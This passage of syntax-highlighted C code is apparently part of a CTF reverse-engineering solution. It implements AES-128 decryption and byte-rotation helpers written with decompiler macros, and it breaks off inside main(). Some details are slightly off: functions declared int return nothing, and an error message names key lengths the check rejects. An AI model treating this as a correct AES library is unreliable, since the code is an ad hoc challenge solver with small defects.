class="hljs-number">0x08000000</span>,<br>                              <span class="hljs-number">0x10000000</span>, <span class="hljs-number">0x20000000</span>,<br>                              <span class="hljs-number">0x40000000</span>, <span class="hljs-number">0x80000000</span>,<br>                              <span class="hljs-number">0x1b000000</span>, <span class="hljs-number">0x36000000</span> &#125;;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 密钥扩展中的T函数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">T</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, <span class="hljs-keyword">int</span> round)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> numArray[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> result;<br>    splitIntToArray(num, numArray);<br>    leftLoop4int(numArray, <span class="hljs-number">1</span>);<span class="hljs-comment">//字循环</span><br><br>    <span class="hljs-comment">//字节代换</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        numArray[i] = getNumFromSBox(numArray[i]);<br><br>    result = mergeArrayToInt(numArray);<br>    <span class="hljs-keyword">return</span> result ^ Rcon[round];<br>&#125;<br><br><span class="hljs-comment">//密钥对应的扩展数组</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> w[<span class="hljs-number">44</span>];<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印W数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printW</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i, j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>, j = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">44</span>; i++,j++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;w[%d] = 0x%x &quot;</span>, i, w[i]);<br>        <span class="hljs-keyword">if</span>(j % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 扩展密钥，结果是把w[44]中的每个元素初始化</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">extendKey</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        w[i] = getWordFromStr(key + i * <span class="hljs-number">4</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">4</span>, j = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">44</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span>( i % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>) &#123;<br>            w[i] = w[i - <span class="hljs-number">4</span>] ^ T(w[i - <span class="hljs-number">1</span>], j);<br>            j++;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            w[i] = w[i - <span class="hljs-number">4</span>] ^ w[i - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 轮密钥加</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addRoundKey</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> round)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> warray[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br><br>        splitIntToArray(w[ round * <span class="hljs-number">4</span> + i], warray);<br><br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>            <span class="hljs-built_in">array</span>[j][i] = <span class="hljs-built_in">array</span>[j][i] ^ warray[j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 字节代换</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">subBytes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span></span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">array</span>[i][j] = getNumFromSBox(<span class="hljs-built_in">array</span>[i][j]);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 行移位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">shiftRows</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rowTwo[<span class="hljs-number">4</span>], rowThree[<span class="hljs-number">4</span>], rowFour[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        rowTwo[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i];<br>        rowThree[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i];<br>        rowFour[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i];<br>    &#125;<br><br>    leftLoop4int(rowTwo, <span class="hljs-number">1</span>);<br>    leftLoop4int(rowThree, <span class="hljs-number">2</span>);<br>    leftLoop4int(rowFour, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i] = rowTwo[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i] = rowThree[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i] = rowFour[i];<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 列混合要用到的矩阵</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> colM[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<br>                                <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>,<br>                                <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>,<br>                                <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span> &#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result = s &lt;&lt; <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> a7 = result &amp; <span class="hljs-number">0x00000100</span>;<br><br>    <span class="hljs-keyword">if</span>(a7 != <span class="hljs-number">0</span>) &#123;<br>        result = result &amp; <span class="hljs-number">0x000000ff</span>;<br>        result = result ^ <span class="hljs-number">0x1b</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul3</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul4</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(GFMul2(s));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul8</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(GFMul4(s));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul9</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul8(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul11</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul9(s) ^ GFMul2(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul12</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul8(s) ^ GFMul4(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul13</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul12(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul14</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul12(s) ^ GFMul2(s);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * GF上的二元运算</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result;<br><br>    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>)<br>        result = s;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">2</span>)<br>        result = GFMul2(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">3</span>)<br>        result = GFMul3(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0x9</span>)<br>        result = GFMul9(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xb</span>)<span class="hljs-comment">//11</span><br>        result = GFMul11(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xd</span>)<span class="hljs-comment">//13</span><br>        result = GFMul13(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xe</span>)<span class="hljs-comment">//14</span><br>        result = GFMul14(s);<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mixColumns</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br><br>    <span class="hljs-keyword">int</span> tempArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            tempArray[i][j] = <span class="hljs-built_in">array</span>[i][j];<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)&#123;<br>            <span class="hljs-built_in">array</span>[i][j] = GFMul(colM[i][<span class="hljs-number">0</span>],tempArray[<span class="hljs-number">0</span>][j]) ^ GFMul(colM[i][<span class="hljs-number">1</span>],tempArray[<span class="hljs-number">1</span>][j])<br>                          ^ GFMul(colM[i][<span class="hljs-number">2</span>],tempArray[<span class="hljs-number">2</span>][j]) ^ GFMul(colM[i][<span class="hljs-number">3</span>], tempArray[<span class="hljs-number">3</span>][j]);<br>        &#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把4X4数组转回字符串</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">convertArrayToStr</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>], <span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            *str++ = (<span class="hljs-keyword">char</span>)<span class="hljs-built_in">array</span>[j][i];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 检查密钥长度</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">checkKeyLen</span><span class="hljs-params">(<span class="hljs-keyword">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(len == <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 根据索引从逆S盒中获取值</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNumFromS1Box</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> row = getLeft4Bit(index);<br>    <span class="hljs-keyword">int</span> col = getRight4Bit(index);<br>    <span class="hljs-keyword">return</span> S2[row][col];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆字节变换</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deSubBytes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">array</span>[i][j] = getNumFromS1Box(<span class="hljs-built_in">array</span>[i][j]);<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把4个元素的数组循环右移step位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rightLoop4int</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> step)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        temp[i] = <span class="hljs-built_in">array</span>[i];<br><br>    index = step % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : step % <span class="hljs-number">4</span>;<br>    index = <span class="hljs-number">3</span> - index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">3</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-built_in">array</span>[i] = temp[index];<br>        index--;<br>        index = index == <span class="hljs-number">-1</span> ? <span class="hljs-number">3</span> : index;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆行移位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deShiftRows</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rowTwo[<span class="hljs-number">4</span>], rowThree[<span class="hljs-number">4</span>], rowFour[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        rowTwo[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i];<br>        rowThree[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i];<br>        rowFour[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i];<br>    &#125;<br><br>    rightLoop4int(rowTwo, <span class="hljs-number">1</span>);<br>    rightLoop4int(rowThree, <span class="hljs-number">2</span>);<br>    rightLoop4int(rowFour, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i] = rowTwo[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i] = rowThree[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i] = rowFour[i];<br>    &#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆列混合用到的矩阵</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> deColM[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>,<br>                                  <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>,<br>                                  <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>,<br>                                  <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deMixColumns</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> tempArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            tempArray[i][j] = <span class="hljs-built_in">array</span>[i][j];<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)&#123;<br>            <span class="hljs-built_in">array</span>[i][j] = GFMul(deColM[i][<span class="hljs-number">0</span>],tempArray[<span class="hljs-number">0</span>][j]) ^ GFMul(deColM[i][<span class="hljs-number">1</span>],tempArray[<span class="hljs-number">1</span>][j])<br>                          ^ GFMul(deColM[i][<span class="hljs-number">2</span>],tempArray[<span class="hljs-number">2</span>][j]) ^ GFMul(deColM[i][<span class="hljs-number">3</span>], tempArray[<span class="hljs-number">3</span>][j]);<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把两个4X4数组进行异或</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addRoundTowArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> aArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>],<span class="hljs-keyword">int</span> bArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            aArray[i][j] = aArray[i][j] ^ bArray[i][j];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 从4个32位的密钥字中获得4X4数组，</span><br><span class="hljs-comment"> * 用于进行逆列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getArrayFrom4W</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> index,j;<br>    <span class="hljs-keyword">int</span> colOne[<span class="hljs-number">4</span>], colTwo[<span class="hljs-number">4</span>], colThree[<span class="hljs-number">4</span>], colFour[<span class="hljs-number">4</span>];<br>    index = i * <span class="hljs-number">4</span>;<br>    splitIntToArray(w[index], colOne);<br>    splitIntToArray(w[index + <span class="hljs-number">1</span>], colTwo);<br>    splitIntToArray(w[index + <span class="hljs-number">2</span>], colThree);<br>    splitIntToArray(w[index + <span class="hljs-number">3</span>], colFour);<br><br>    <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">0</span>] = colOne[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">1</span>] = colTwo[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">2</span>] = colThree[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">3</span>] = colFour[j];<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 参数 c: 密文的字符串数组。</span><br><span class="hljs-comment"> * 参数 clen: 密文的长度。</span><br><span class="hljs-comment"> * 参数 key: 密钥的字符串数组。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deAes</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *c, <span class="hljs-keyword">int</span> clen, <span class="hljs-keyword">char</span> *key)</span> </span>&#123;<br><br>    <span class="hljs-keyword">int</span> cArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> keylen,k;<br>    keylen = <span class="hljs-built_in">strlen</span>(key);<br>    <span class="hljs-keyword">if</span>(clen == <span class="hljs-number">0</span> || clen % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;密文字符长度必须为16的倍数！现在的长度为%d\n&quot;</span>,clen);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!checkKeyLen(keylen)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;密钥字符长度错误！长度必须为16、24和32。当前长度为%d\n&quot;</span>,keylen);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    extendKey(key);<span class="hljs-comment">//扩展密钥</span><br><br>    <span class="hljs-keyword">for</span>(k = <span class="hljs-number">0</span>; k &lt; clen; k += <span class="hljs-number">16</span>) &#123;<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">int</span> wArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br><br>        convertToIntArray(c + k, cArray);<br><br><br><br><br><br>        addRoundKey(cArray, <span class="hljs-number">10</span>);<br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>            deSubBytes(cArray);<br><br>            deShiftRows(cArray);<br><br>            deMixColumns(cArray);<br>            getArrayFrom4W(i, wArray);<br>            deMixColumns(wArray);<br><br>            addRoundTowArray(cArray, wArray);<br>        &#125;<br><br>        deSubBytes(cArray);<br><br>        deShiftRows(cArray);<br><br>        addRoundKey(cArray, <span class="hljs-number">0</span>);<br><br>        convertArrayToStr(cArray, c + k);<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">rol</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] )</span></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        a[i][<span class="hljs-number">0</span>] = __ROL1__(a[i][<span class="hljs-number">0</span>], i);<br>        a[i][<span class="hljs-number">1</span>] = __ROL1__(a[i][<span class="hljs-number">1</span>], i);<br>        a[i][<span class="hljs-number">2</span>] = __ROL1__(a[i][<span class="hljs-number">2</span>], i);<br>        a[i][<span class="hljs-number">3</span>] = __ROL1__(a[i][<span class="hljs-number">3</span>], i);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ror</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] )</span></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        a[i][<span class="hljs-number">0</span>] = __ROR1__(a[i][<span class="hljs-number">0</span>], i);<br>        a[i][<span class="hljs-number">1</span>] = __ROR1__(a[i][<span class="hljs-number">1</span>], i);<br>        a[i][<span class="hljs-number">2</span>] = __ROR1__(a[i][<span class="hljs-number">2</span>], i);<br>        a[i][<span class="hljs-number">3</span>] = __ROR1__(a[i][<span class="hljs-number">3</span>], i);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> xor2[<span class="hljs-number">16</span>] = &#123;<br>            <span class="hljs-number">0x61</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x78</span><br>    